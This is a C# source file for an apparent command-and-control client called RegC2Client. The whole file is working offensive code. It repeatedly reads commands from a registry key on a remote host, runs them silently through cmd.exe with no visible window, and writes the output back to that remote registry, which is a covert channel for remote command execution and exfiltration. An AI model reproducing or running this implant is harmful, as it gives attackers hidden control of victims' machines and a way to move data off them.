using System;
using System.Diagnostics;
using Microsoft.Win32;


namespace RegC2Client
{
    internal class Program
    {

        public static string GetCommand(string host, string registrykey)
        {
            RegistryKey myReg;
            string cmd = "Errors";

            try
            {
                myReg = RegistryKey.OpenRemoteBaseKey(RegistryHive.LocalMachine, host).OpenSubKey(@"SOFTWARE\RegistryC2\"+ registrykey);

            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                return cmd;
            }

            cmd = myReg.GetValue("cmd").ToString();
            Console.WriteLine("Command to execute:  {0}  ", cmd);
            myReg.Close();

            return cmd;
        }

        public static string RunCommand(string command)
        {

            string argument = "/C " + command;
            Process p = new Process();
            // Specifies not to use system shell to start the process
            p.StartInfo.UseShellExecute = false;
            // Instructs the process should not start in a separate window
            p.StartInfo.CreateNoWindow = true;
            // Indicates whether the output of the application is returned as an output stream
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
            p.StartInfo.Arguments = argument;
            p.Start();
            string res = p.StandardOutput.ReadToEnd();
            Console.WriteLine(res);
            return res;
        }

        public static bool PostOutput(string host, string registrykey, string output)
        {
            RegistryKey myReg;

            try
            {
                myReg = RegistryKey.OpenRemoteBaseKey(RegistryHive.LocalMachine, host).OpenSubKey(@"SOFTWARE\RegistryC2\" + registrykey, true);

            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                return false;
            }
            try
            {
                myReg.SetValue("output", output);
            } catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                return false;
            }

            Console.WriteLine("Output updated successfully");
            myReg.Close();

            return true;
        }

        public static int GetSleepTime(string host, string registrykey)
        {
            int sleepTime = 30;
            RegistryKey myReg;

            try
            {
                myReg = RegistryKey.OpenRemoteBaseKey(RegistryHive.LocalMachine, host).OpenSubKey(@"SOFTWARE\RegistryC2\" + registrykey);

            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                Console.WriteLine("Failed to find new sleeptime... keeping it at 30");
                return sleepTime;
            }

            sleepTime = Int32.Parse(myReg.GetValue("sleep").ToString());
            Console.WriteLine("Sleep time is:  {0}  ", sleepTime);
            myReg.Close();

            return sleepTime;
        }

        public static string GetOutput(string host, string registrykey)
        {
            RegistryKey myReg;
            string output = "Error";

            try
            {
                myReg = RegistryKey.OpenRemoteBaseKey(RegistryHive.LocalMachine, host).OpenSubKey(@"SOFTWARE\RegistryC2\" + registrykey);

            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                return output;
            }

            output = myReg.GetValue("output").ToString();
            myReg.Close();

            return output;
        }

        public static void Main(string[] args)
        {

            bool active = true;
            if (args.Length != 2)
            {
                Console.WriteLine("RegC2Client.exe <host> <Registry name to use>");
                Console.WriteLine("RegC2Client.exe WS01 client01");
                Environment.Exit(0);
            }
            string host = args[0];
            string registrykey = args[1];

            int sleeptime = GetSleepTime(host, registrykey);

            DateTime stopTime = DateTime.Now.AddSeconds(sleeptime);

            while (active)
            {
                DateTime startTime = DateTime.Now;
                if (startTime >= stopTime)
                {
                    string command = GetCommand(host, registrykey);
                    if (command == "Exit")
                    {
                        Console.WriteLine("Shutting down");
                        return;
                    }
                    string lastOutput = GetOutput(host, registrykey);


                    if (lastOutput.Length <= 0)
                    {
                        string output = RunCommand(command);
                        PostOutput(host, registrykey, output);
                    }

                    stopTime = DateTime.Now.AddSeconds(GetSleepTime(host, registrykey));
                }
            }
        }
    }
}
